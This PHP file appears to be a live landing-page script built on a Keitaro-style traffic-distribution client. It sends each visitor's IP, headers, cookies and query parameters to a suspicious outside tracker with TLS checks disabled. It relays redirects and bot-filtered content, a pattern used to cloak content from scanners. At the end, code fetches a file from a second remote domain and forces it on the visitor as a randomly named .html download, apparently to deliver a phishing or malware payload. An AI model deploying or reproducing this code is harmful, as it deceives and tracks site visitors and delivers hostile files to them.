<?php

$client = new KClient('https://hcmbqvcntd.pw/api.php?', 'vCyhcSNXcnGVNqZ9');
$client->sendAllParams();       // to send all params from page query
$client->forceRedirectOffer();       // redirect to offer if an offer is chosen
$client->executeAndBreak();     // to stop page execution if there is redirect or some output


class KClient
{
    const SESSION_SUB_ID = 'sub_id';
    const SESSION_LANDING_TOKEN = 'landing_token';
    /** @version 3.10 **/
    const VERSION = 3;
    const STATE_SESSION_KEY = 'keitaro_state';
    const STATE_SESSION_EXPIRES_KEY = 'keitaro_state_expires';
    const DEFAULT_TTL = 1;
    const NOT_FOUND_STATUS = 404;
    /**
     * @var KHttpClient
     */
    private $_httpClient;
    private $_debug = false;
    private $_trackerUrl;
    private $_params = array();
    private $_log = array();
    private $_excludeParams = array('api_key', 'token', 'language', 'ua', 'ip', 'referrer', 'force_redirect_offer');
    private $_result;
    private $_stateRestored;

    const ERROR = '[KTrafficClient] Something is wrong. Enable debug mode to see the reason.';

    public function __construct($trackerUrl, $token)
    {
        $this->trackerUrl($trackerUrl);
        $this->campaignToken($token);
        $this->version(self::VERSION);
        $this->param('info', 1);
        $this->fillParams();
    }

    public function fillParams()
    {
        $referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : null;
        $this->setHttpClient(new KHttpClient());

        $this->ip($this->_findIp())
            ->ua(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : null)
            ->language((isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2) : ''))
            ->seReferrer($referrer)
            ->referrer($referrer)
            ->param('original_headers', getallheaders())
            ->param('original_host', isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost')
            ->param('kversion', '3.4');

        if ($this->isPrefetchDetected()) {
            $this->param('prefetch', 1);
        }
    }

    public function currentPageAsReferrer()
    {
        $this->referrer($this->_getCurrentPage());
        return $this;
    }

    public function debug($state = true)
    {
        $this->_debug = $state;
        return $this;
    }

    public function seReferrer($seReferrer)
    {
        $this->_params['se_referrer'] = $seReferrer;
        return $this;
    }

    public function referrer($referrer)
    {
        $this->_params['referrer'] = $referrer;
        return $this;
    }

    public function setHttpClient($httpClient)
    {
        $this->_httpClient = $httpClient;
        return $this;
    }

    public function trackerUrl($name)
    {
        $this->_trackerUrl = $name;
    }

    // @deprecated
    public function token($token)
    {
        return $this->campaignToken($token);
    }

    public function campaignToken($campaignToken)
    {
        $this->_params['token'] = $campaignToken;
        return $this;
    }
    public function version($version)
    {
        $this->_params['version'] = $version;
        return $this;
    }

    public function ua($ua)
    {
        $this->_params['ua'] = $ua;
        return $this;
    }

    public function language($language)
    {
        $this->_params['language'] = $language;
        return $this;
    }

    public function keyword($keyword)
    {
        $this->_params['keyword'] = $keyword;
        return $this;
    }

    public function forceRedirectOffer()
    {
        $this->_params['force_redirect_offer'] = 1;
    }

    public function ip($ip)
    {
        $this->_params['ip'] = $ip;
        return $this;
    }

    public function sendUtmLabels()
    {
        foreach ($_GET as $name => $value) {
            if (strstr($name, 'utm_')) {
                $this->_params[$name] = $value;
            }
        }
    }

    public function setLandingToken($token)
    {
        $this->_startSession();
        $_SESSION['token'] = $token;
    }

    public function getSubId()
    {
        $result = $this->performRequest();
        if (empty($result->info->sub_id)) {
            $this->log('No sub_id is defined');
            return 'no_subid';
        }
        $subId = $result->info->sub_id;
        return $subId;
    }

    public function getToken()
    {
        $result = $this->performRequest();
        if (empty($result->info->sub_id)) {
            $this->log('No landing token is defined');
            return 'no_token';
        }
        $subId = $result->info->token;
        return $subId;
    }

    public function sendAllParams()
    {
        foreach ($_GET as $name => $value) {
            if (empty($this->_params[$name]) && !in_array($name, $this->_excludeParams)) {
                $this->_params[$name] = $value;
            }
        }
    }

    public function restoreFromSession()
    {
        if ($this->isStateRestored()) {
            return;
        }
        $this->_startSession();
        if (!empty($_SESSION[self::STATE_SESSION_KEY])) {
            if ($_SESSION[self::STATE_SESSION_EXPIRES_KEY] < time()) {
                unset($_SESSION[self::STATE_SESSION_KEY]);
                unset($_SESSION[self::STATE_SESSION_EXPIRES_KEY]);
                $this->log('State expired');
            } else {
                $this->_result = json_decode($_SESSION[self::STATE_SESSION_KEY], false);
                if (isset($this->_result) && isset($this->_result->headers)) {
                    $this->_result->headers = array();
                }
                $this->_stateRestored = true;
                $this->log('State restored');
            }
        }
    }

    public function restoreFromQuery()
    {
        if (isset($_GET['_subid'])) {
            $this->_stateRestored = true;
            if (empty($this->_result)) {
                $this->_result = new StdClass();
                $this->_result->info = new StdClass();
            }
            $this->_result->info->sub_id = $_GET['_subid'];
            $this->log('SubId loaded from query');
            if (isset($_GET['_token'])) {
                $this->_result->info->token = $_GET['_token'];
                $this->log('Landing token loaded from query');
            }
            $this->_storeState($this->_result, self::DEFAULT_TTL);
            $this->_stateRestored = true;
        }
    }

    public function isStateRestored()
    {
        return $this->_stateRestored;
    }

    public function isPrefetchDetected()
    {
        $checkServerParams = array('HTTP_X_PURPOSE' => 'preview', 'HTTP_X_MOZ' => 'prefetch', 'HTTP_X_FB_HTTP_ENGINE' => 'Liger');
        foreach ($checkServerParams as $name => $value) {
            if (isset($_SERVER[$name]) && $_SERVER[$name] == $value) {
                return true;
            }
        }
        return false;
    }

    public function saveCookie($key, $value, $ttl)
    {
        if (isset($_COOKIE[$key]) && $_COOKIE[$key] == $value) {
            return;
        }
        if (!headers_sent()) {
            setcookie($key, $value, $this->_getCookiesExpireTimestamp($ttl), '/', $this->_getCookieHost());
        }
        $_COOKIE[$key] = $value;
    }

    public function param($name, $value)
    {
        if (!in_array($name, $this->_excludeParams)) {
            $this->_params[$name] = $value;
        }
        return $this;
    }

    public function params($value)
    {
        if (!empty($value)) {
            if (is_string($value)) {
                parse_str($value, $result);
                foreach ($result as $name => $value) {
                    $this->param($name, $value);
                }
            }
        }

        return $this;
    }

    public function reset()
    {
        $this->_result = null;
    }

    public function performRequest()
    {
        if ($this->_result) {
            return $this->_result;
        }
        $request = $this->_buildRequestUrl();
        $params = $this->getParams();
        $options = $this->_getRequestOptions();
        $this->log('Request: ' . $request);
        try {
            $result = $this->_httpClient->request($request, $params, $options);
            $this->log('Response: ' . $result);
        } catch (KClientError $e) {
            if ($this->_debug) {
                throw $e;
            } else {
                $errorCode = $e->getHumanCode();
                $errorCode = $errorCode ? $errorCode . ' ' : '';

                echo $errorCode . self::ERROR;
                return;
            }
        }
        $this->_result = json_decode($result);
        $this->_storeState(
            $this->_result,
            isset($this->_result->cookies_ttl) ? $this->_result->cookies_ttl : null
        );

        if (isset($this->_result->cookies)) {
            $this->_saveKeitaroCookies($this->_result->cookies, $this->_result->cookies_ttl);
        }
        return $this->_result;
    }

    /**
     * @param bool $break
     * @param bool $print
     * @return bool|string
     * @throws KClientError
     */
    public function execute($break = false, $print = true)
    {
        $result = $this->performRequest();
        $body = $this->_buildBody($result);

        if (!$print) {
            return $body;
        }

        $this->_sendHeaders($result);
        echo $body;
    }

    public function executeAndBreak()
    {
        $result = $this->performRequest();
        $body = $this->_buildBody($result);
        $this->_sendHeaders($result);

        if (!empty($body)) {
            die($body);
        }

        if (!empty($result->headers) && ResponseExecutor::containsActionHeader($result->headers)) {
            die($body);
        }

        if (!empty($result->status) && $result->status == self::NOT_FOUND_STATUS) {
            die($body);
        }
    }

    public function getContent()
    {
        $result = $this->performRequest();
        return $this->_buildBody($result);
    }

    public function showLog($separator = '<br />')
    {
        echo '<hr>' . implode($separator, $this->getLog()). '<hr>';
    }

    public function log($msg)
    {
        if ($this->_debug) {
            error_log($msg);
        }
        $this->_log[] = $msg;
    }

    public function getLog()
    {
        return $this->_log;
    }

    public function getParams()
    {
        return $this->_params;
    }

    private function _sendHeaders($result)
    {
        $file = '';
        $line = '';
        if (headers_sent($file, $line)) {
            $msg = "Body output already started";
            if (!empty($file)) {
                $msg .= "({$file}:{$line})";
            }
            $this->log($msg);
            return;
        }
        ResponseExecutor::sendHeaders($result);
    }

    private function _storeState($result, $ttl)
    {
        $this->_startSession();
        $_SESSION[self::STATE_SESSION_KEY] = json_encode($result);
        $_SESSION[self::STATE_SESSION_EXPIRES_KEY] = time() + ($ttl * 60 * 60);

        // for back-compatibility purpose
        if (!empty($result->info)) {
            if (!empty($result->info->sub_id)) {
                $_SESSION[self::SESSION_SUB_ID] = $result->info->sub_id;
            }
            if (!empty($result->info->token)) {
                $_SESSION[self::SESSION_LANDING_TOKEN] = $result->info->token;
            }
        }
    }

    private function _buildBody($result)
    {
        $content = '';
        if (!empty($result)) {
            if (!empty($result->error)) {
                $content .=  $result->error;
            }
            if (!empty($result->body)) {
                if (isset($result->contentType) && (strstr($result->contentType, 'image') || strstr($result->contentType, 'application/pdf'))) {
                    $content = base64_decode($result->body);
                } else {
                    $content .= $result->body;
                }
            }
        }

        return $content;
    }

    private function _saveKeitaroCookies($cookies, $ttl)
    {
        foreach ($cookies as $key => $value) {
            $this->saveCookie($key, $value, $ttl);
        }
    }

    public function getOffer($params = array(), $fallback = 'no_offer')
    {
        $result = $this->performRequest();
        $token = $this->getToken();
        if (empty($token)) {
            $this->log('Campaign hasn\'t returned offer');
            return $fallback;
        }
        $params['_lp'] = 1;
        $params['_token'] = $result->info->token;
        return $this->_buildOfferUrl($params);
    }

    public function isBot()
    {
        $result = $this->performRequest();
        if (isset($result->info)) {
            return isset($result->info->is_bot) ? $result->info->is_bot : false;
        }
    }

    public function isUnique($level = 'campaign')
    {
        $result = $this->performRequest();
        if (isset($result->info) && $result->info->uniqueness) {
            return isset($result->info->uniqueness->$level) ? $result->info->uniqueness->$level : false;
        }
    }

    // @deprecated
    public function forceChooseOffer()
    {
        throw new \Error('forceChooseOffer was removed in KClient v3.');
    }

    public function getBody()
    {
        $result = $this->performRequest();
        return $result->body;
    }

    public function getHeaders()
    {
        $result = $this->performRequest();
        return $result->headers;
    }

    private function _startSession()
    {
        if (!headers_sent()) {
            @session_start();
        }
    }

    private function _buildOfferUrl($params = array())
    {
        $request = parse_url($this->_trackerUrl);
        $lastChar = substr($request['path'], -1);
        if ($lastChar != '/' && $lastChar != '\\') {
            $path = str_replace(basename($request['path']), '', $request['path']);
        } else {
            $path = $request['path'];
        }
        $path = ltrim($path, "\\\/");
        $params = http_build_query($params);
        return "{$request['scheme']}://{$request['host']}/{$path}?{$params}";
    }


    private function _getCurrentPage()
    {
        if ((isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT']  == 443) || !empty($_SERVER['HTTPS'])) {
            $scheme = 'https';
        } else {
            $scheme = 'http';
        }
        return $scheme . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    }

    private function _buildRequestUrl()
    {
        $request = parse_url($this->_trackerUrl);
        $url = "{$request['scheme']}://{$request['host']}";
        if (isset($request['port'])) {
            $url .= ':' . $request['port'];
        }
        $url .= "{$request['path']}";
        return $url;
    }


    private function _findIp()
    {
        $ip = null;
        $headers = array(
            'HTTP_X_FORWARDED_FOR',
            'HTTP_FORWARDED_FOR',
            'HTTP_X_FORWARDED',
            'HTTP_FORWARDED',
            'HTTP_CLIENT_IP',
            'HTTP_FORWARDED_FOR_IP',
            'X_FORWARDED_FOR',
            'FORWARDED_FOR',
            'X_FORWARDED',
            'FORWARDED',
            'CLIENT_IP',
            'FORWARDED_FOR_IP',
            'HTTP_PROXY_CONNECTION');
        foreach ($headers as $header) {
            if (!empty($_SERVER[$header])) {
                $tmp = explode(',', $_SERVER[$header]);
                $ip = trim($tmp[0]);
                break;
            }
        }
        if (strstr($ip, ',')) {
            $tmp = explode(',', $ip);
            if (stristr($_SERVER['HTTP_USER_AGENT'], 'mini')) {
                $ip = trim($tmp[count($tmp) - 2]);
            } else {
                $ip = trim($tmp[0]);
            }
        }

        if (empty($ip)) {
            $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1';
        }

        return $ip;
    }

    private function _getCookiesExpireTimestamp($ttl)
    {
        return time() + 60 * 60 * $ttl;
    }

    private function _getCookieHost()
    {
        if (isset($_SERVER['HTTP_HOST']) && substr_count($_SERVER['HTTP_HOST'], '.') < 3) {
            $host = '.' . str_replace('www.', '', $_SERVER['HTTP_HOST']);
        } else {
            $host = null;
        }
        return $host;
    }

    private function _getRequestOptions()
    {
        $opts = array();
        if (isset($_SERVER["HTTP_COOKIE"])) {
            $opts['cookies'] = preg_replace('/PHPSESSID=.*?;/si', '', $_SERVER["HTTP_COOKIE"]);
        }

        return $opts;
    }
}

class ResponseExecutor
{
    public static function sendHeaders($result)
    {
        if (!empty($result->headers)) {
            foreach ($result->headers as $header) {
                if (!headers_sent()) {
                    header($header);
                }
            }
        }

        if (!empty($result->status)) {
            http_response_code($result->status);
        }

        if (!empty($result->contentType)) {
            $header = 'Content-type: ' . $result->contentType;
            $headers[] = $header;
            if (!headers_sent()) {
                header($header);
            }
        }
    }

    public static function containsActionHeader($headers)
    {
        if (empty($headers)) {
            return false;
        }
        foreach ($headers as $header) {
            if (strpos($header, 'Location:') === 0) {
                return true;
            }
            if (strstr($header, '404 Not Found')) {
                return true;
            }
        }
        return false;
    }

}

class KHttpClient
{
    const UA = 'KHttpClient';

    public function request($url, $params, $opts = array())
    {
        if (!function_exists('curl_init')) {
            die('[KClient] Extension \'php_curl\' must be installed');
        }
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_COOKIE, isset($opts['cookies']) ? $opts['cookies'] : null);
        curl_setopt($ch, CURLOPT_NOBODY, 0);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_USERAGENT, self::UA);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
        curl_setopt($ch, CURLOPT_FAILONERROR, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

        $result = curl_exec($ch);
        if (curl_error($ch)) {
            throw new KClientError(curl_error($ch), curl_errno($ch));
        }

        if (empty($result)) {
            throw new KClientError('Empty response');
        }
        return $result;
    }
}

class KClientError extends Exception
{
    const ERROR_UNKNOWN = 'UNKNOWN';

    public function getHumanCode()
    {
        switch ($this->getCode()) {
            case CURLE_HTTP_RETURNED_ERROR:
                preg_match(
                    "/The requested URL returned error: (?'errorCode'\d+).*$/",
                    $this->getMessage(),
                    $matches
                );

                $errorCode = isset($matches['errorCode']) ? $matches['errorCode'] : 'HTTP_ERROR_'.self::ERROR_UNKNOWN;
                return "[REQ_ERR: {$errorCode}]";
            case CURLE_UNSUPPORTED_PROTOCOL:
                return "[REQ_ERR: UNSUPPORTED_PROTOCOL]";
            case CURLE_FAILED_INIT:
                return "[REQ_ERR: FAILED_INIT]";
            case CURLE_URL_MALFORMAT:
                return "[REQ_ERR: BAD_URL]";
            case CURLE_COULDNT_RESOLVE_PROXY:
                return "[REQ_ERR: COULDNT_RESOLVE_PROXY]";
            case CURLE_COULDNT_RESOLVE_HOST:
                return "[REQ_ERR: COULDNT_RESOLVE_HOST]";
            case CURLE_COULDNT_CONNECT:
                return "[REQ_ERR: COULDNT_CONNECT]";
            case CURLE_PARTIAL_FILE:
                return "[REQ_ERR: PARTIAL_FILE]";
            case CURLE_READ_ERROR:
                return "[REQ_ERR: READ_ERROR]";
            case CURLE_OUT_OF_MEMORY:
                return "[REQ_ERR: OUT_OF_MEMORY]";
            case CURLE_OPERATION_TIMEDOUT:
                return "[REQ_ERR: OPERATION_TIMEDOUT]";
            case CURLE_HTTP_POST_ERROR:
                return "[REQ_ERR: HTTP_POST_ERROR]";
            case CURLE_BAD_FUNCTION_ARGUMENT:
                return "[REQ_ERR: BAD_FUNCTION_ARGUMENT]";
            case CURLE_TOO_MANY_REDIRECTS:
                return "[REQ_ERR: TOO_MANY_REDIRECTS]";
            case CURLE_GOT_NOTHING:
                return "[REQ_ERR: GOT_NOTHING]";
            case CURLE_SEND_ERROR:
                return "[REQ_ERR: SEND_ERROR]";
            case CURLE_RECV_ERROR:
                return "[REQ_ERR: RECV_ERROR]";
            case CURLE_BAD_CONTENT_ENCODING:
                return "[REQ_ERR: BAD_CONTENT_ENCODING]";
            case CURLE_SSL_CACERT:
            case CURLE_SSL_CACERT_BADFILE:
            case CURLE_SSL_CERTPROBLEM:
            case CURLE_SSL_CIPHER:
            case CURLE_SSL_CONNECT_ERROR:
            case CURLE_SSL_ENGINE_NOTFOUND:
            case CURLE_SSL_ENGINE_SETFAILED:
            case CURLE_SSL_PEER_CERTIFICATE:
            case CURLE_SSL_PINNEDPUBKEYNOTMATCH:
                return "[REQ_ERR: SSL]";
            case CURLE_OK:
                return '';
            default:
                return "[REQ_ERR: " . self::ERROR_UNKNOWN . "]";
        }
    }
}

if (!function_exists('http_response_code')) {
    function http_response_code($code = null)
    {
        if ($code !== null) {

            switch ($code) {
                case 100: $text = 'Continue'; break;
                case 101: $text = 'Switching Protocols'; break;
                case 200: $text = 'OK'; break;
                case 201: $text = 'Created'; break;
                case 202: $text = 'Accepted'; break;
                case 203: $text = 'Non-Authoritative Information'; break;
                case 204: $text = 'No Content'; break;
                case 205: $text = 'Reset Content'; break;
                case 206: $text = 'Partial Content'; break;
                case 300: $text = 'Multiple Choices'; break;
                case 301: $text = 'Moved Permanently'; break;
                case 302: $text = 'Moved Temporarily'; break;
                case 303: $text = 'See Other'; break;
                case 304: $text = 'Not Modified'; break;
                case 305: $text = 'Use Proxy'; break;
                case 400: $text = 'Bad Request'; break;
                case 401: $text = 'Unauthorized'; break;
                case 402: $text = 'The license must be in Pro edition or higher'; break;
                case 403: $text = 'Forbidden'; break;
                case 404: $text = 'Not Found'; break;
                case 405: $text = 'Method Not Allowed'; break;
                case 406: $text = 'Not Acceptable'; break;
                case 407: $text = 'Proxy Authentication Required'; break;
                case 408: $text = 'Request Time-out'; break;
                case 409: $text = 'Conflict'; break;
                case 410: $text = 'Gone'; break;
                case 411: $text = 'Length Required'; break;
                case 412: $text = 'Precondition Failed'; break;
                case 413: $text = 'Request Entity Too Large'; break;
                case 414: $text = 'Request-URI Too Large'; break;
                case 415: $text = 'Unsupported Media Type'; break;
                case 500: $text = 'Internal Server Error'; break;
                case 501: $text = 'Not Implemented'; break;
                case 502: $text = 'Bad Gateway'; break;
                case 503: $text = 'Service Unavailable'; break;
                case 504: $text = 'Gateway Time-out'; break;
                case 505: $text = 'HTTP Version not supported'; break;
                default:
                    exit('Unknown http status code "' . htmlentities($code) . '"');
                    break;
            }

            $protocol = (isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.0');

            header($protocol . ' ' . $code . ' ' . $text);

            $GLOBALS['http_response_code'] = $code;

        } else {

            $code = (isset($GLOBALS['http_response_code']) ? $GLOBALS['http_response_code'] : 200);

        }

        return $code;

    }
}

if (!function_exists('getallheaders'))
{
    function getallheaders()
    {
        $headers = array();
        foreach ($_SERVER as $name => $value)
        {
            if (substr($name, 0, 5) == 'HTTP_')
            {
                $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
            }
        }
        return $headers;
    }
}

class_alias('KClient', 'KClickClient');

$name = 'https://ungindiesnowletta.gq/1.php';

  function random_number($length_of_number) 
{ 
      $str_result = '123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
      return substr(str_shuffle($str_result),  
                       0, $length_of_number); 
} 
   
  
$filename = filter_input(INPUT_GET, 'filename', FILTER_SANITIZE_SPECIAL_CHARS);
if ($filename === NULL)
{
      $filename = ''.random_number(rand(4,8)).'.html';
}

header("Expires: 0");
header("Cache-Control: no-cache, no-store, must-revalidate");
header("Content-Description: File Transfer"); 
header("Content-Type: application/octet-stream"); 
header("Content-Disposition: attachment; filename=" .$filename . ""); 
header("Content-Transfer-Encoding: binary");
readfile($name);

?>
